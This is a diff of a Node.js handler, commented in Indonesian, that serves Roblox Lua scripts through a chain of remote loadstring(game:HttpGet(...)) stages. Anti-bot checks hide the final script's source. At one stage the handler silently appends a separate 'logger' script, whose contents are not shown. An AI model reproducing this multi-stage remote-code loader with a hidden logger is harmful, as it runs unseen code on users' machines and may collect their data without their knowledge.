@@ -97,7 +97,7 @@ module.exports = async function(req, res) {
     const currentPath = urlParts[0];
     
     try {
-        // ========== STEP 0: INIT SESSION ==========
+        // ========== STEP 0: INIT ==========
         if (currentStep === 0) {
             let sequence = [];
             while (sequence.length < SETTINGS.TOTAL_LAYERS) {
@@ -106,8 +106,7 @@ module.exports = async function(req, res) {
             }
 
             const { newSessionID, nextKey, waitTime } = makeSession(cleanIp, sequence, 0);
-            const firstStep = sequence[0];
-            const nextUrl = "https://" + host + currentPath + "?" + firstStep + "." + newSessionID + "." + nextKey;
+            const nextUrl = "https://" + host + currentPath + "?" + sequence[0] + "." + newSessionID + "." + nextKey;
             const luaScript = "task.wait(" + (waitTime / 1000) + ") loadstring(game:HttpGet(\"" + nextUrl + "\"))()";
             return res.status(200).send(luaScript);
         }
@@ -120,8 +119,7 @@ module.exports = async function(req, res) {
             return res.status(getRandomError()).send(plainResp || "SECURITY : BANNED ACCESS!");
         }
 
-        const expectedStep = session.stepSequence[session.currentIndex];
-        if (currentStep !== expectedStep) {
+        if (currentStep !== session.stepSequence[session.currentIndex]) {
             delete sessions[id];
             return res.status(getRandomError()).send("SECURITY : BANNED ACCESS!");
         }
@@ -138,8 +136,7 @@ module.exports = async function(req, res) {
             return res.status(getRandomError()).send("SECURITY : BANNED ACCESS!");
         }
 
-        const timeSinceLastRequest = now - session.lastTime;
-        if (timeSinceLastRequest < session.requiredWait) {
+        if ((now - session.lastTime) < session.requiredWait) {
             blacklist[cleanIp] = true;
             delete sessions[id];
             await sendSecurityLogToLogJs("🚫 **DETECT BOT** - Timing violation", cleanIp, "bot_detect");
@@ -149,40 +146,38 @@ module.exports = async function(req, res) {
         const idx = session.currentIndex;
         session.used = true;
 
-        /*
-         * idx 0 → layer 1 → redirect
-         * idx 1 → layer 2 → redirect
-         * idx 2 → layer 3 → redirect
-         * idx 3 → layer 4 → redirect
-         * idx 4 → layer 5 → loadstring layer 6 (atas) + logger (bawah)
-         * idx 5 → layer 6 → MAIN SCRIPT ✅
-         */
+        // idx 0 sampai TOTAL_LAYERS-1
+        // contoh TOTAL_LAYERS=6:
+        // idx 0,1,2,3 → redirect biasa
+        // idx 4        → logger (atas loadstring, bawah logger)
+        // idx 5        → main script
 
-        // ========== LAYER 6 (idx 5): MAIN SCRIPT SAJA ==========
-        if (idx === 5) {
+        // ========== LAYER TERAKHIR (idx = TOTAL_LAYERS-1): MAIN SCRIPT ==========
+        if (idx === SETTINGS.TOTAL_LAYERS - 1) {
             const mainScript = await fetchRaw(SETTINGS.REAL_SCRIPT_URL);
             delete sessions[id];
             return res.status(200).send(mainScript || '');
         }
 
-        // ========== LAYER 5 (idx 4): LOADSTRING KE LAYER 6 ATAS + LOGGER BAWAH ==========
-        if (idx === 4) {
-            const nextStepNumber = session.stepSequence[5];
+        // ========== LAYER SEBELUM TERAKHIR (idx = TOTAL_LAYERS-2): LOGGER + LOADSTRING ==========
+        if (idx === SETTINGS.TOTAL_LAYERS - 2) {
+            const nextIdx = SETTINGS.TOTAL_LAYERS - 1;
+            const nextStepNumber = session.stepSequence[nextIdx];
             const { newSessionID, nextKey, waitTime } = makeSession(
-                session.ownerIP, session.stepSequence, 5
+                session.ownerIP, session.stepSequence, nextIdx
             );
             delete sessions[id];
 
             const loggerScript = await fetchRaw(SETTINGS.LOGGER_SCRIPT_URL);
             const nextUrl = "https://" + host + currentPath + "?" + nextStepNumber + "." + newSessionID + "." + nextKey;
 
-            // loadstring PALING ATAS, logger jalan di bawah bersamaan
+            // loadstring PALING ATAS, logger di bawah
             const luaScript = "task.wait(" + (waitTime / 1000) + ") loadstring(game:HttpGet(\"" + nextUrl + "\"))()\n" +
                               (loggerScript || '');
             return res.status(200).send(luaScript);
         }
 
-        // ========== LAYER 1-4 (idx 0-3): REDIRECT BIASA ==========
+        // ========== LAYER BIASA (idx 0 sampai TOTAL_LAYERS-3): REDIRECT ==========
         const nextIndex = idx + 1;
         const nextStepNumber = session.stepSequence[nextIndex];
         const { newSessionID, nextKey, waitTime } = makeSession(
